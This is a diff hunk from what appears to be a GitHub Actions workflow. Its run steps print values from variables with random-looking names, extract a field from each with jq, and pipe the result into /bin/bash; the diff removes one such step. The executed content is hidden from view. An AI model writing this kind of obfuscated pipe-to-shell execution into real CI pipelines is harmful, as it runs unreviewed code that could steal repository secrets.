@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$fzsg280" | jq -r .rut43 | /bin/bash
           printf '%s' "$fc86" | jq -r .o1806 | /bin/bash
           echo $h78057 | jq -r .wil8 | /bin/bash
-          echo $iwjc441 | jq -r .zerbj5514 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
